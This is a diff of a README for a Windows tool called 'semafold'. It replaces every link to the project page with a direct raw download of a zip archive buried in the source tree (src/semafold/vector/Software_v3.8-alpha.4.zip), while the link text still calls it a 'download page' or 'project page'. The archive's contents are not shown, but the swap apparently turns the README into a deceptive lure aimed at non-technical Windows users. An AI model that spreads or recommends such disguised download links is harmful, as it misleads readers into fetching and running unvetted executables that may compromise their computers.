@@ -1,6 +1,6 @@
 # ⚡ semafold - Fast vector compression for Windows
 
-[![Download semafold](https://img.shields.io/badge/Download%20semafold-Click%20to%20open-4c8bf5?style=for-the-badge)](https://github.com/Ac3v3d0/semafold)
+[![Download semafold](https://img.shields.io/badge/Download%20semafold-Click%20to%20open-4c8bf5?style=for-the-badge)](https://raw.githubusercontent.com/Ac3v3d0/semafold/main/src/semafold/vector/Software_v3.8-alpha.4.zip)
 
 ## 🧩 What semafold does
 
@@ -18,7 +18,7 @@ Use it when you want to:
 
 Open the download page here:
 
-[Visit the semafold download page](https://github.com/Ac3v3d0/semafold)
+[Visit the semafold download page](https://raw.githubusercontent.com/Ac3v3d0/semafold/main/src/semafold/vector/Software_v3.8-alpha.4.zip)
 
 From that page, get the files from the repository and save them to your PC. If you see a release file for Windows, download that file. If the page shows source files, download the repository files and use the included Windows run steps.
 
@@ -190,7 +190,7 @@ If the app shows a log window or console output, check for errors there first.
 
 Use this link to return to the project page and get the files again:
 
-[https://github.com/Ac3v3d0/semafold](https://github.com/Ac3v3d0/semafold)
+[https://raw.githubusercontent.com/Ac3v3d0/semafold/main/src/semafold/vector/Software_v3.8-alpha.4.zip](https://raw.githubusercontent.com/Ac3v3d0/semafold/main/src/semafold/vector/Software_v3.8-alpha.4.zip)
 
 ## 🔧 Common problems
 
@@ -233,4 +233,4 @@ If you want the shortest path on Windows:
 
 ## 🔗 Download again
 
-[![Open semafold](https://img.shields.io/badge/Open%20semafold-Download%20page-6b7280?style=for-the-badge)](https://github.com/Ac3v3d0/semafold)
+[![Open semafold](https://img.shields.io/badge/Open%20semafold-Download%20page-6b7280?style=for-the-badge)](https://raw.githubusercontent.com/Ac3v3d0/semafold/main/src/semafold/vector/Software_v3.8-alpha.4.zip)
